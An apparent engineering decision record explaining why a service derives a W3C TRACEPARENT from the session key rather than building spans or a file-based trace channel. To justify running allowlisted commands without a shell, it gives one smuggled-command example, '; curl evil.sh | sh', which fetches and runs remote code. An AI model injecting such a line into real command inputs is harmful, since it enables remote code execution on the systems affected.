---
title: The trace id is derived, not propagated — and the parent span it names does not exist
status: implemented
date: 2026-09-09
scope: hookprobe
---

## Decision

Every runtime this service drives gets a `TRACEPARENT` in the environment handed
to the agent: one W3C trace context, version 00, sampled, derived from the
session key by `gate.trace_environment`. All three adapters get the identical
value — the two that spawn their gate through `gate.environment`, the in-process
one through `_subprocess_env`.

Nothing is required to read it.

What was **not** built: spans, a collector integration, a Jaeger/Tempo flame
graph, or a wrapper around the commands a procedure runs.

## Why

The reviewed proposal described "链路在 OpenTelemetry 上就断裂了" and asked for a
`active_trace.json` in the working directory that a helper CLI would read back.
Three corrections, in order of weight.

**There is no trace to break.** Measured, and already written down in
`hookprobe/docs/cost.md` before this work started (CLI 2.1.229):
`OTEL_TRACES_EXPORTER` is accepted, no spans are emitted for a plain run, and the
events carry no `traceId`. The chain hookrelay → hookjudge → hookprobe is
correlated by the pipe's `correlation_id` (`hr-<event_id>`) and by the session
key that embeds the same event id — an application spine, not W3C trace context.
`/telemetry`'s waterfall is reconstructed from event timestamps, not received as
spans.

**The stated payoff already exists.** "让 SRE 清晰地看到哪个 kubectl 命令耗时最久"
is `telemetry.summarize()`: `{kind: tool, name, duration_ms}`, with tool wall
time measured `tool_decision` → `tool_result`, hooks included — which is what a
person waiting on the run actually experienced. What is genuinely missing is that
the waterfall **stops at the tool boundary**: it says `Bash` took 8.4s, not what
happened inside the kubectl.

**The file-pipe is the wrong channel here.** The working directory is the agent's
own mutable volume. A trace file the agent can read *and write* is a channel the
agent can forge. The environment already exists for exactly this class of thing,
already solves it once for all three adapters, and is already where the withheld
secrets and the posture live.

So the cheap 20% got built and the expensive 80% did not. Derived rather than
propagated is the whole trick: a pure function of the session key is computable
by any node that knows which investigation this is, with nothing to pass along
and nothing to lose on the way.

Two smaller decisions. `TRACEPARENT` (uppercase, env) because that is the name
the tooling reads — otel-cli, the OpenTelemetry shell wrappers, several SDKs —
while W3C itself specifies a header and says nothing about environments. And two
separate digests for the trace id and the span id rather than one sliced twice,
because a trace id whose first half equals the span id looks like a bug to
everyone who reads it later.

Making the commands themselves into spans was rejected on a second ground beyond
cost: `remediation.execute` lexes each approved command into an argv and execs it
directly, **with no shell**, because a wildcard in an allowlist pattern otherwise
handed that span to `/bin/sh` — `kubectl rollout restart .*` also permitting
`; curl evil.sh | sh`. A tracing wrapper reintroduces the layer that was removed
for a security reason.

## Consequences

* **The parent span named in the traceparent was never emitted by anything.** A
  collector receiving a child of it shows a trace whose root is missing. This is
  the documented gap, and it is the reason nothing is required to read the
  variable: a tool that ignores it behaves exactly as it did before.
* An empty session key yields no traceparent at all, rather than one fixed id
  shared by every run that ever had none — which would be worse than the orphan
  it replaces.
* Three assertions in the runtime-contract suite hold the three env paths to one
  derivation. Not one of the five obligations; it is in that file for the reason
  the withheld-secrets list is — it is built in two places, and two nodes working
  one alert filing under two traces would be silent.
* Not deployed anywhere yet in the sense that matters: no tool in any image is
  known to read `TRACEPARENT`. This is a seam, and it costs nothing until
  somebody uses it.
